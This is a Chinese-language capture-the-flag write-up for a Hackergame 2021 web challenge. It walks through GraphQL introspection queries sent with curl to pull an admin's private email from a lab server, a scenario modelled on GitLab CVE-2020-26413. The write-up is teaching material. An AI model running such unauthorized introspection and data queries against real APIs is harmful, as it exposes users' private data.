# 图之上的信息

题解作者：[taoky](https://github.com/taoky)

出题人、验题人、文案设计等：见 [Hackergame 2021 幕后工作人员](https://hack.lug.ustc.edu.cn/credits/)。

## 题目描述

- 题目分类：web

- 题目分值：200

- 题目链接：[http://202.38.93.111:15001/?token={token}](http://202.38.93.111:15001/)

小 T 听说 GraphQL 是一种特别的 API 设计模式，也是 RESTful API 的有力竞争者，所以他写了个小网站来实验这项技术。

你能通过这个全新的接口，获取到没有公开出来的管理员的邮箱地址吗？

## 背景

本题是一道关于 GraphQL 的简单题目，尝试模仿了 GitLab 的 CVE-2020-26413 漏洞。GitLab 的这个漏洞也是 GraphQL 接口权限控制不当，导致用户未公开的邮箱被公开。（当然，新版的 GitLab 早就修了，现在只能从这个接口获取用户主动公开的邮箱。）

实话讲，虽然 GraphQL 概念很漂亮，但是实践中出题人不太会用，和自己熟悉的框架总感觉有点儿膈应。本来想出成 GraphQL + SQL 注入的题目，但是后来总感觉设计出来的题目很怪异，最后就改成了现在这样。

## 解法

用 guest/guest 登录，打开检查元素就能看到有个对 `/graphql` 接口的请求。了解过 GraphQL 的同学应该都知道一般来讲，这样的接口有个网页版的 GraphiQL 可以交互，而且还有自动补全、错误提示等功能，很方便。然而，`/graphql` 直接请求没有这种东西，`/graphiql` 就直接告诉你：为了「安全性」，GraphiQL 是不会给你的。

所以还是自己来吧。GraphQL 基础可以把 https://graphql.org/learn/ 略读一遍。

（以下的 GraphQL 的术语表述可能不是很严谨）

获取 notes 的请求格式化之后长这样：

```graphql
{
    notes(userId: 2) {
        id
        contents
    }
}
```

这是一个查询 (query)，请求了 `notes` 对象（它也是 root query 的 field）里的 `id` 和 `contents` 这两个 field，参数为 `userId: 2`。那么要查询用户相关的数据怎么做呢？一种方法是猜，但是 GraphQL 有更好的方式来获取信息：[Introspection](https://graphql.org/learn/introspection/)（我也不知道怎么翻译最准确，「自省」？）。

先读一下上面的链接以及[链接里对应 GraphQL TypeScript 的源代码 introspection.ts](https://github.com/graphql/graphql-js/blob/main/src/type/introspection.ts)（可选）。当然如果能找个其他的 GraphiQL 的站点自己玩效果会更好。

先问问 GraphQL 我们有哪些类型可以用吧！

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

怎么发送呢？可以用 Burp Suite 改包，但是我更喜欢直接用 `curl`，所以下面以此为例子。使用浏览器检查元素复制为 cURL 命令之后修改（去掉不需要的部分），可以得到下面的命令：

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ notes(userId: 2) { id\ncontents }}"}'
```

改一下 `--data-raw` 后面的东西就行。

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ __schema {types { name }}}"}'
{"data":{"__schema":{"types":[{"name":"Query"},{"name":"GNote"},{"name":"Int"},{"name":"String"},{"name":"GUser"},{"name":"Boolean"},{"name":"__Schema"},{"name":"__Type"},{"name":"__TypeKind"},{"name":"__Field"},{"name":"__InputValue"},{"name":"__EnumValue"},{"name":"__Directive"},{"name":"__DirectiveLocation"}]}}}
```

可以看到两个画风不太一样的类型：`GNote` 和 `GUser`。来更进一步看看 `GUser` 的详细信息吧。

```graphql
{
  __type(name: 'GUser') {
    name
    kind
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{__type(name: \"GUser\") {name kind fields {name type {name kind}}} }"}'
{"data":{"__type":{"name":"GUser","kind":"OBJECT","fields":[{"name":"id","type":{"name":"Int","kind":"SCALAR"}},{"name":"username","type":{"name":"String","kind":"SCALAR"}},{"name":"privateEmail","type":{"name":"String","kind":"SCALAR"}}]}}}
```

这里已经可以看到 `privateEmail` 是 `GUser` 类型的 field 了，也是我们需要找的东西之一。但是已有的信息还不足以构建完整的查询（如果还是猜不出来正确的 query）。怎么办呢？可以试试 `__schema` 下面的 `queryType`:

```graphql
{
  __schema {
    queryType {
      name
    }
  }
}
```

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ __schema {queryType { name }}}"}'
{"data":{"__schema":{"queryType":{"name":"Query"}}}}
```

嗯？我们是不是还漏了啥？

> And that matches what we said in the type system section, that the `Query` type is where we will start!

所以要不看看 `Query` 的 fields？

```graphql
{
  __schema {
    queryType {
      name
      fields {
        name
      }
    }
  }
}
```

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ __schema {queryType { name fields {name}}}}"}'
{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"note"},{"name":"notes"},{"name":"user"}]}}}}
```

可以得到我们要查询的实际上是 `user` 这个 field。但是还是差一块拼图：参数。看上面提到的源代码，可以看到一些有意思的东西：

```typescript
args: {
  type: new GraphQLNonNull(
    new GraphQLList(new GraphQLNonNull(__InputValue)),
  ),
  args: {
    includeDeprecated: {
      type: GraphQLBoolean,
      defaultValue: false,
    },
  },
  resolve(field, { includeDeprecated }) {
    return includeDeprecated
      ? field.args
      : field.args.filter((arg) => arg.deprecationReason == null);
  },
},
```

`args` 看起来可以写在 `fields` 里面。当然如果不想看源代码，直接搜索也是可以的，出题的时候也参考了 [DigitalOcean 的 GraphQL Introspection 教程](https://www.digitalocean.com/community/tutorials/graphql-introspection-queries)。

```graphql
{
  __schema {
    queryType {
      name
      fields {
        name
        args {
          name
        }
      }
    }
  }
}
```

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ __schema {queryType { name fields {name args{name}}}}}"}'
{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"note","args":[{"name":"id"}]},{"name":"notes","args":[{"name":"userId"}]},{"name":"user","args":[{"name":"id"}]}]}}}}
```

参数是 `id`。其实已经可以开始写查询了。`guest` 的 `userId` 是 2，那么 `admin` 的 `id` 八九不离十是 1：

```graphql
{
  user(id: 1) {
    id
    username
    privateEmail
  }
}
```

```console
$ curl 'http://202.38.93.111:15001/graphql' -X POST \
  -H 'Content-Type: application/json' \
  -H 'Cookie: <你自己得到的 Cookie>' \
  --data-raw '{"query":"{ user(id: 1) {id username privateEmail}}"}'
{"data":{"user":{"id":1,"username":"admin","privateEmail":"flag{dont_let_graphql_l3ak_data_<redacted>@hackergame.ustc}"}}}
```

搞定～

## 附录

为了摆脱 Pythongame 的诅咒（咳咳咳），出题人本来想用 Rust 实现这道题目，后来因为来不及 + 技术力不够，所以还是用了最熟悉的 Python Web 框架来实现。不过不管用啥应该都不会有大影响。

另外，本道题也说明了，关掉 GraphiQL 对安全性没啥帮助……该拿到的东西都可以通过 introspection 操作拿到。
